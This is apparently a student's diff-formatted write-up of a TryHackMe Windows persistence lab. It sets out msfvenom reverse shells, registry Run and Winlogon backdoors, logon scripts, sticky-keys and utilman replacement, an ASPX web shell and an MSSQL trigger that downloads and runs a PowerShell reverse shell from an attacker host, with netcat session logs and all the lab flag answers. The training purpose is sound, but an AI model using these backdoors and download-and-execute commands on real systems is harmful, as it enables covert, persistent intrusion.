@@ -909,3 +909,459 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
 After transferring it to the victim machine, let's move it to C:\Windows\:
 ```text
 Command Prompt
+```
+```text
+C:\> move revshell.exe C:\Windows
+```
+Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The entry's name can be anything you like, and the value will be the command we want to execute.
+Note: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use MyBackdoor to receive the flag.
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
+THM flagUsing your newly obtained shell, execute C:\flags\flag11.exe to get a flag!
+Winlogon
+Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).
+Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:
+Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
+shell points to the system's shell, which is usually explorer.exe.
+If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.
+Let's start by creating a shell:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
+```
+We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
+```text
+Command Prompt
+```
+```text
+C:\> move revshell.exe C:\Windows
+```
+We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+THM flagUsing your newly obtained shell, execute C:\flags\flag12.exe to get a flag!
+Logon scripts
+One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
+Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
+Let's first create a reverse shell to use for this technique:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
+```
+We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
+```text
+Command Prompt
+```
+```text
+C:\> move revshell.exe C:\Windows
+```
+To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:
+Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+THM flagUsing your newly obtained shell, execute C:\flags\flag13.exe to get a flag!
+```text
+──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4450 -f exe -o revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 17:24:00] "GET /revshell.exe HTTP/1.1" 200 -
+
+PS C:\Users\Administrator> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe
+PS C:\Users\Administrator> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4450
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4450
+Ncat: Listening on 0.0.0.0:4450
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:50007.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag10.exe
+.\flag10.exe
+THM{NO_NO_AFTER_YOU}
+```
+Insert flag10 here
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4451 -f exe -o revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ ls
+index.raw     liv0ff.ps1          payload.hta   rev-svc2.exe  thm.hta
+launcher.bat  live0fftheland.dll  revshell.exe  rev-svc.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 17:38:29] "GET /revshell.exe HTTP/1.1" 200 -
+
+create a new exapndable string value
+
+sign out
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4451
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4451
+Ncat: Listening on 0.0.0.0:4451
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:50035.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag11.exe            
+.\flag11.exe
+THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
+```
+![[Pasted image 20220911164426.png]]
+Insert flag11 here
+![[Pasted image 20220911165257.png]]
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4452 -f exe -o revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 17:50:13] "GET /revshell.exe HTTP/1.1" 200 -
+
+PS C:\Users\Administrator> cd C:\Windows
+PS C:\Windows> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4452
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4452
+Ncat: Listening on 0.0.0.0:4452
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:50050.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag12.exe
+.\flag12.exe
+THM{I_INSIST_GO_FIRST}
+```
+Insert flag12 here
+![[Pasted image 20220911165827.png]]
+![[Pasted image 20220911171545.png]]
+remove this cz won't get flag13
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4453 -f exe -o revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 17:56:38] "GET /revshell.exe HTTP/1.1" 200 -
+
+PS C:\Users\Administrator> cd C:\Windows                                                                                PS C:\Windows> wget http://10.11.81.220:1337/revshell.exe -o revshell.exe
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ xfreerdp /u:Administrator /p:'Passwd123' /v:10.10.170.100 /size:85%
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4453
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4453
+Ncat: Listening on 0.0.0.0:4453
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:50091.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag13.exe
+.\flag13.exe
+THM{USER_TRIGGERED_PERSISTENCE_FTW}
+```
+Insert flag13 here
+### Backdooring the Login Screen / RDP
+If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.
+We will look at two methods that rely on accessibility features to this end.
+Sticky Keys
+When pressing key combinations like CTRL + ALT + DEL, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL, press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL + ALT + DEL combination.
+To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
+After pressing SHIFT 5 times, Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
+A straightforward way to backdoor the login screen consists of replacing sethc.exe with a copy of cmd.exe. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
+To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of cmd.exe. We can do so with the following commands:
+```text
+Command Prompt
+```
+```text
+C:\> takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".
+```
+```text
+C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+```text
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
+        1 file(s) copied.
+```
+After doing so, lock your session from the start menu:
+You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
+From your newly obtained terminal, execute C:\flags\flag14.exe to get your flag!
+Utilman
+Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
+When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.
+To replace utilman.exe, we do a similar process to what we did with sethc.exe:
+```text
+Command Prompt
+```
+```text
+C:\> takeown /f c:\Windows\System32\utilman.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".
+```
+```text
+C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+processed file: C:\Windows\System32\utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+```text
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
+        1 file(s) copied.
+```
+To trigger our terminal, we will lock our screen from the start button:
+And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
+From your newly obtained terminal, execute C:\flags\flag15.exe to get your flag!
+```text
+C:\Users\Administrator>takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "WPERSISTENCE\Administrator".
+
+C:\Users\Administrator>icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
+        1 file(s) copied.
+
+locked then shift 5 times
+```
+![[Pasted image 20220911172233.png]]
+![[Pasted image 20220911172243.png]]
+Insert flag14 here
+```text
+C:\Users\Administrator>takeown /f c:\Windows\System32\utilman.exe                                                                                                                                                                               SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "WPERSISTENCE\Administrator".                                                                                                                                C:\Users\Administrator>icacls C:\Windows\System32\utilman.exe /grant Administrator:F                                    processed file: C:\Windows\System32\utilman.exe                                                                         Successfully processed 1 files; Failed processing 0 files                                                                                                                                                                                       C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe                                 Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes                                                                    1 file(s) copied.   
+
+lock then ease access
+```
+![[Pasted image 20220911172530.png]]
+![[Pasted image 20220911172546.png]]
+Insert flag15 here
+### Persisting Through Existing Services
+If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!
+Using Web Shells
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the Windows Privesc Room.
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here, but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:
+```text
+Command Prompt
+```
+```text
+C:\> move shell.aspx C:\inetpub\wwwroot\
+```
+We can then run commands from the web server by pointing to the following URL:
+http://MACHINE_IP/shell.aspx
+Use your web shell to execute C:\flags\flag16.exe to get your flag!
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+Using MSSQL as a Backdoor
+There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the HRDB database.
+Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the xp_cmdshell stored procedure. xp_cmdshell is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
+To enable it, let's open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
+Once logged in, click on the New Query button to open the query editor:
+Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.
+```text
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:
+```text
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+After all of this, we finally configure a trigger. We start by changing to the HRDB database:
+```text
+USE HRDB
+```
+Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:
+```text
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:
+![[Pasted image 20220911151553.png]]
+We will need to open two terminals to handle the connections involved in this exploit:
+The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
+The second connection will be a reverse shell on port 4454 back to our attacker machine.
+```text
+AttackBox
+
+user@AttackBox$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+```text
+AttackBox
+
+user@AttackBox$ nc -lvp 4454
+Listening on 0.0.0.0 4454
+```
+With all that ready, let's navigate to http://MACHINE_IP/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
+THM flagUse your web shell to execute C:\flags\flag17.exe to get your flag!
+```text
+
+```
+![[Pasted image 20220911180949.png]]
+![[Pasted image 20220911181031.png]]
+Insert flag16 here
+![[Pasted image 20220911181956.png]]
+![[Pasted image 20220911182030.png]]
+![[Pasted image 20220911182053.png]]
+![[Pasted image 20220911182115.png]]
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -lvp 4454
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4454
+Ncat: Listening on 0.0.0.0:4454
+Ncat: Connection from 10.10.242.120.
+Ncat: Connection from 10.10.242.120:49763.
+whoami
+nt service\mssql$sqlexpress
+PS C:\Windows\system32> cd C:\Flags
+PS C:\Flags> .\flag17.exe
+THM{I_LIVE_IN_YOUR_DATABASE}
+
+after create evilscript.ps1 and query in sqlserver
+```
+Insert flag17 here
+### Conclusion
+In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.
+While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:
+Hexacorn - Windows Persistence https://www.hexacorn.com/blog/category/autostart-persistence/
+PayloadsAllTheThings - Windows Persistence https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+Oddvar Moe - Windows Persistence Through RunOnceEx  https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
+PowerUpSQL https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/
+Click and continue learning!
+*No answer needed*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9023b48f1f25613de9ab9ccf27843037.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/765671a0355e2260c44e5a12a10f090e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/380c80b98c4d1f8c2149ef72427cfeb0.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d630140974989748ebcf150ba0696d14.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f2072b6d13b7343cf7b890586703ddf.png)
+- ***THM{FLAG_BACKED_UP!}***
+- ***THM{IM_JUST_A_NORMAL_USER}***
+- ***THM{TRUST_ME_IM_AN_ADMIN}** *
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7a7349b9dcc5af3180044ee1d7605967.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fe703ddea6135e0c867afcc6f61a8cd2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3ae1b8356b38a349090e836026d6d480.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c3565cf93de4990f41f41b25aed80571.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f7ed25a701cf20ea85cf333b20708ffe.png)
+- ***THM{NO_SHORTCUTS_IN_LIFE}***
+- ***THM{TXT_FILES_WOULD_NEVER_HURT_YOU}***
+- ***THM{SUSPICIOUS_SERVICES}***
+- ***THM{IN_PLAIN_SIGHT}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png)
+- ***THM{JUST_A_MATTER_OF_TIME}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png)
+- ***THM{NO_NO_AFTER_YOU}***
+- ***THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}***
+- ***THM{I_INSIST_GO_FIRST}***
+- ***THM{USER_TRIGGERED_PERSISTENCE_FTW}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png)
+- ***THM{BREAKING_THROUGH_LOGIN}***
+- ***THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png)
+- ***THM{EZ_WEB_PERSISTENCE}*** https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+- ***THM{I_LIVE_IN_YOUR_DATABASE}***
+
+## Notes / Lessons Learned
+[[Network Security Solutions]]
+
